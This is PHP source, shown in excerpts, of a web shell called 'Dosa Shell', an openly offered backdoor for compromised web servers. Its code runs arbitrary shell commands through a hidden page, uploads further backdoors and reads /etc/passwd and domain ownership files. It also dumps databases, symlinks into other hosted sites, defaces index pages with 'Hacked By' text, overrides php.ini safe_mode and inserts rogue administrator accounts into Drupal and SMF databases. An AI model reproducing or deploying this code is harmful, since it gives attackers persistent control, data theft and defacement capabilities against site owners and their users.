<?php
/*
	Author: 	dosa.inv/Alfa-Team
	Telegram: 	https://telegram.me/dosa.inv
	YouTube: 	https://youtube.com/dosa.inv
	Gmail:		dosa.inv@fbi.gov
...
define("__DOSA_VERSION__", "4.1");
define("__ALFA_UPDATE__", "2");
define("__DOSA_CODE_NAME__", "Dosa Shell");
define("__DOSA_DATA_FOLDER__", "dosa_data");
define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_DosaSecretKey():'');
$GLOBALS['__DOSA_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#e77be5",
		...
		"Alfa+" => array(
			"key_color" => "#06ff0f",
			"multi_selector" => array(
				".dosa_plus" => "color: {color};font-weight: unset;",
			)
		),
...
$config = array('DosaUser' => $GLOBALS['DB_NAME']['user'],'DosaPass' => $GLOBALS['DB_NAME']['pass'],'DosaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'DosaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
if($config['DosaLoginPage'] == 'gui'){
if(@$_COOKIE["DosaUser"] != $config['DosaUser'] && $_COOKIE["DosaPass"] != md5($config['DosaPass'])){
if(@$_POST["usrname"]==$config['DosaUser'] && @md5($_POST["password"])==$config['DosaPass']){
__dosa_set_cookie("DosaUser", $config['DosaUser']);
__dosa_set_cookie("DosaPass", @md5($config['DosaPass']));
...
<title>~ Dosa Shell Shell-v'.__DOSA_VERSION__.'-'.__DOSA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Dosa Shell 2024" draggable="false" src="https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_4.webp" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Dosa Shell Shell-v'.__DOSA_VERSION__.'-'.__DOSA_CODE_NAME__.' ~</b></font></th></tr>
...
}elseif($config['DosaLoginPage']=='500'){
if(@$_COOKIE["DosaPass"] != @md5($config['DosaPass'])){
if(@md5($_POST["password"])==$config['DosaPass']){
__dosa_set_cookie("DosaUser", $config['DosaUser']);
__dosa_set_cookie("DosaPass", @md5($config['DosaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
}elseif($config['DosaLoginPage']=='403'){
if(@$_COOKIE["DosaPass"] != @md5($config['DosaPass'])){
if(@md5($_POST["password"])==$config['DosaPass']){
__dosa_set_cookie("DosaUser", $config['DosaUser']);
__dosa_set_cookie("DosaPass", @md5($config['DosaPass']));
...
}elseif($config['DosaLoginPage']=='404'){
if(@$_COOKIE["DosaPass"] != @md5($config['DosaPass'])){
if(@md5($_POST["password"])==$config['DosaPass']){
__dosa_set_cookie("DosaUser", $config['DosaUser']);
__dosa_set_cookie("DosaPass", @md5($config['DosaPass']));
...
function _DosaSecretKey(){
	$secret = @$_COOKIE["DosaSecretKey"];
	if(!isset($_COOKIE["DosaSecretKey"])){
		$secret = uniqid(mt_rand(), true);
		__dosa_set_cookie("DosaSecretKey", $secret);
	}
	return $secret;
}
function dosa_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__DOSA_COLOR__"][$target];
		if(is_array($target)){
...
function alfaCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__DOSA_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = dosa_getColor($key);
			$css .= ".{$key}{color: {$value};}";
		}else{
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){
					$color = dosa_getColor($key);
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["dosacgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["dosachiapi"])){
			if(!@file_exists("dosachiapi/".$_COOKIE["dosachiapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["dosachiapi"];
			}
		}
		if(!isset($_COOKIE["dosachiapi"])||$recreate){
			...
			if($lang == "aspx"){
				dosaWriteTocgiapi("aspx.aspx",$aspx);
			}else{
				dosaWriteTocgiapi($lang.".alfa",$source);
			}
			alfacgihtaccess('cgi', "dosachiapi/");
		}else{
			$lang = $_COOKIE["dosachiapi"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __DOSA_DATA_FOLDER__."/dosachiapi/".$lang.$cgi_ext;
		...
		if($is_curl){
			...
			$data = _dosa_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strpos($data, "[dosa.inv~api]") !== false && strpos($data, '[dosa.inv~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__dosa_set_cookie("dosachiapi", $lang);
			}
			...
			if($set_cookie){
				__dosa_set_cookie("dosacgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
function dosaEx($in,$re=false,$cgi=true,$all=false){
...
function _dosa_fsockopen($server,$uri,$post){
...
if(isset($_GET["dosa.inv"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>Dosa Hidden Shell</title>";
...
echo "PWD:<font color=#8f4df5> " . str_replace("\\","/",@dosaGetCwd()) . "/<br />";
...
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@dosaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
...
$solevisible = "cd '".addslashes(str_replace("\\","/",@dosaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo dosaEx($solevisible);
}
echo'</pre>
</body></html>';
exit;}
...
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@dosaGetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @dosaGetCwd());
}
if($GLOBALS['sys'] == 'win'){
...
function dosahead(){
$GLOBALS['__Dosa_Shell_Code'] = '';
$Dosa_Uploader = '$x = base64_decode("'.$GLOBALS['__Dosa_Shell_Code'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("Dosa_Uploader", "eval(base64_decode('".__ZW5jb2Rlcg($Dosa_Uploader)."'))");
if(!isset($_POST['ajax'])){
...
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="dosa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function DosaNum(){
$args = func_get_args();
$alfax = array();
...
$cmd_uname = dosaEx("uname -a",false,false);
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?dosa.inv"><span style="color:#7f2ce9;">'.__DOSA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__DOSA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Dosa Shell 2024" draggable="false" src="https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_4.webp" /></td>
</tr>
<tr>
...
if(!@ini_get('safe_mode')){
if(strlen(dosaEx("id",false,false))>0){
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_dosa.inv"><center><a href="https://t.me/dosa.inv" target="_blank"><span><font class="dosa.inv-text" color="#f900ff">Dosa Shell</font></span></a></center></div></td>
</tr>
<tr>
...
echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="dosa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="dosa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Dosa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="dosa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="dosa_plus">Dosa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="dosa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['DosaUser']) && !empty($_COOKIE['DosaPass']) ? '<a href="javascript:void(0);" onclick="dosaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="dosaFilesmanTabShowTitle(this,event);" onmouseout="dosaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="dosaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
...
function dosaLogOut(){
@setcookie("DosaUser", null, 2012);
@setcookie("DosaPass", null, 2012);
unset($_COOKIE['DosaUser'],$_COOKIE['DosaPass']);
echo("ok");
}
...
function __showicon($r){
	...
	$s['dosamini']='https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_1.webp';
	$s['loader']='https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_1.webp';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Dosa Shell is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Dosa Shell Uploader</option><option value='my'>My Private Shell</option></select>";
...
__alert($success."<br>Run With: ".basename($file)."?dosa=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
alfafooter();
}
function alfawhois(){
...
if($data==''){$get = new DosaCURL();$get->ssl = true;$data = $get->Send($target);}
$target = @json_decode($data,true);
echo __pre();
if(is_array($target)){echo($target["whois_raw"]);}else{echo dosaEx("whois ".$site);}}
echo("</div>");
}
...
$buff = dosaEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = dosaEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
...
if(empty($content)||!$content){
	$content = dosaEx("cat '".addslashes($file)."'");
}
return $content;
}
function alfaMarket(){
...
$curl = new DosaCURL();
$content = $curl->Send("http://dosa.Inv.com/market.php");
...
if($data["status"] == "open"){
	...
	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the dosa.Inv market....! try later.</div>";
}
echo "</div>";
}
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#8f4df5">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#8f4df5">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#8f4df5">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#8f4df5">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#8f4df5">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#8f4df5">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="dosa.inv"></td></tr><tr><td><div class="tbltxt" style="color:#8f4df5">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
if($_POST['alfa7']=='export'){
	...
	$glob_colors = $GLOBALS["__DOSA_COLOR__"];
	$array = array();
...
echo '<div class="header">';
$news = new DosaCURL();
$about_us = $news->Send("https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_4.webp'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Dosa (Dosa Inv)</font><br>
<font color='#00A220'>Contact : dosa@fbi.gov</font><br>
<font color='#00A220'>Telegram Channel: @solevisible</font><br>
<font color='#8f4df5'>Skype : dosa.inv</font><br>
<font color='#FF0000'>Dosa For Ever</font><br>
<font color='#FF0000'>Dosa Programmers</font><br>
...
if(strlen(dosaEx("mysqldump"))>0){
dosaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
...
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?dosaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
...
$DosaCURL->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
...
$DosaCURL->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["dosacgiapi_mode"])&&!isset($_COOKIE["dosachiapi"])){
			_alfa_cgicmd("whoami","perl",true);
			if(strlen(dosaEx("whoami",false,true))>0){
				__dosa_set_cookie("alfa_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new DosaCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__DOSA_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__DOSA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
			...
			if(isset($json["dosa.inv"]) && !empty($json["dosa.inv"])){
				$data["dosa.inv"] = $json["dosa.inv"];
			}
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				$data["code_name"] = $json["code_name"];
				$data["version_number"] = __DOSA_VERSION__;
			}
...
function dosaWriteTocgiapi($name, $source){
	$temp = "";
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __DOSA_DATA_FOLDER__);
	}
	@mkdir('dosachiapi',0755);
	__write_file("dosachiapi/".$name, __get_resource($source));
	@chmod("dosachiapi/".$name, 0755);
	return $temp;
}
function alfacheckcgi(){if(strlen(dosaEx("id",false,true,true))>0)echo("ok");else echo("no");}
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = dosaWriteTocgiapi("getheader.alfa",$bash);
		$data = dosaEx("cd '{$tmp_path}/dosachiapi';sh getheader.alfa",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__dosa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
			echo $data;
		}
	}else{
...
$path = dosaEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
...
function _alfa_can_runCommand($cgi=true,$cache=true){
	...
	if(strlen(dosaEx("whoami",false,$cgi))>0){
...
function _alfa_symlink($target, $link){
	...
	if($phpsym){
		...
		dosaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _alfa_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		...
		if(strlen(dosaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
...
function _alfa_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(dosaEx("id",false,$cgi))>0){
			$data = dosaEx('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
...
function _alfa_is_writable($file){
	...
	if(!$check){
		if(_alfa_can_runCommand()){
			$check = dosaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
...
function _alfa_is_dir($dir,$mode="-d"){
	...
	if(!$check){
		if(_alfa_can_runCommand()){
			$check = dosaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				return true;
			}else{
				return false;
...
if($move_cmd_file&&$alfa_canruncmd){
	dosaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
	...
	if(_alfa_can_runCommand(true,true)){
		if(_alfa_is_writable($GLOBALS['cwd'])){
			if(!_alfa_is_dir(trim($_POST['alfa2']))){
				dosaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
...
if($GLOBALS["glob_chdir_false"]){
	if(_alfa_can_runCommand(true,true)){
		dosaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
dosaEx("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
...
dosaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
}else{
...
if($GLOBALS["glob_chdir_false"]){
	...
	if($source!='..'&&!empty($source)){
		if(_alfa_can_runCommand(true,true)){
			dosaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
...
__dosa_set_cookie('alfa_act', @$_POST['alfa1']);
__dosa_set_cookie('alfa_f', @serialize($_POST['f']));
__dosa_set_cookie('alfa_c', @$_POST['c']);
return;
}
}
break;
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/dosachiapi/getdir.alfa")){
			...
			$tmp_getdir_path = dosaWriteTocgiapi("getdir.alfa",$bash);
			__dosa_set_cookie("alfachdir_bash", "true");
			__dosa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = dosaEx("cd ".$tmp_getdir_path."/dosachiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
if(!@chdir($_POST['c'])){
	...
	if($alfa_canruncmd){
		...
		$file_info = explode(":", dosaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
		$perm_color_class = dosaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['alfa2'] == 'auto'){
...
$_POST['alfa2'] = 'image';
	...
	if($chdir_fals){
		if($alfa_canruncmd){
			$mime = explode(":", dosaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
...
if($chdir_fals&&$alfa_canruncmd){
	if(_alfa_is_writable($_POST["c"])){
		dosaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($alfa1_decoded)."'");
		$_POST['alfa2'] = "edit";
	}
}
...
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_alfa_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", dosaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
	}
}
}
...
if($chdir_fals&&$alfa_canruncmd){
	...
	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
		dosaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
...
if(!@unlink($_POST['alfa1'])){
	...
	if($alfa_canruncmd){
		if(_alfa_is_writable($_POST['alfa1'])){
			dosaEx("rm -f '".addslashes($_POST['alfa1'])."'");
			$deleted = true;
		}
	}
}
...
if($chdir_fals&&$alfa_canruncmd){
dosaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($alfa1_decoded)."'");
echo('Success!');
}else{
...
dosaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
}else{
$cmd_rename = true;
}
}else{
...
$touched = false;
if($chdir_fals&&$alfa_canruncmd){
	dosaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($alfa1_decoded)."'");
	$touched = true;
}
...
if($chdir_fals&&$alfa_canruncmd){
	$source = dosaEx("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", dosaEx("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", dosaEx("file --mime-type '".addslashes($file)."'"));
...
if($GLOBALS["glob_chdir_false"]){
	...
	if(_alfa_is_writable($scriptpath)){
		dosaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		dosaEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __dosa_set_cookie($key, $value){
	$_COOKIE[$key] = $value;
...
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	...
	$tempdir = dirname(dosaEx("mktemp"));
	__dosa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
}
dosahead();
...
$result = htmlspecialchars(ob_get_clean());
	...
	$result = dosaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
	@unlink($filename);
	@unlink($temp);
}
...
<textarea name=index rows='19' cols='103'><title>Hacked By Dosa Shell</title><b>Hacked By Dosa Shell</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By Dosa Shell</title><b>Hacked By Dosa Shell</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo dosaEx($cmd.$_POST['alfa1'], true);
echo '</pre>';
}
echo "</div>";
alfafooter();
...
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
	...
	if(_alfa_can_runCommand(true,true)){
		$user = dosaEx("stat -c '%U' /etc/valiases/".$rep);
	}
}
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Dosa Shell(Dosa Shell)");
...
@fwrite($f, $s);
@fclose($f);
$out = dosaEx($tmpdir."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
...
<input type="text" name="defacer" size="67" id="text" placeholder="Dosa Shell 2024" />
<br>
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'dosa@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','dosa@fbi.gov','filtered_html','1','Europe/Berlin','dosa@fbi.gov')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','dosa@fbi.gov')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __DOSA_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	@chmod($cginame,0755);
	echo __pre();
	$resource = dosaEx("{$lang} {$cginame} {$sympath}",false,true,true);
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__DOSA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#8f4df5;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__DOSA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
	...
	if($anonymous){
		...
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			...
			if($is_posix){
				...
				$owner = dosaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#8f4df5;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__DOSA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	...
	if($passwd){
		...
		if(!$site_domains){
			$site_domains = dosaEx("ls /etc/virtual/");
	...
	if($conn){
		if($type == "load_all_tables"){
			...
			if($db["mode"] == "drop"){
				...
				if(strlen(dosaEx("mysqldump"))>0){
					dosaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
				}else{
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://pub-8037bbcd35c241728ee1b8217a739cea.r2.dev/image_4.webp\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__DOSA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$tmp_path = dosaWriteTocgiapi("basedir.alfa",$bash);
$bash_users  = dosaEx("cd ".$tmp_path."/dosachiapi;sh basedir.alfa ".$makepwd,false,true,true);
...
dosaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
...
dosaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
...
@finfo_close($finfo);
	...
	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
		$file_type = dosaEx('file -b --mime-type ' . $dirzip);
	}
}
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
dosaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
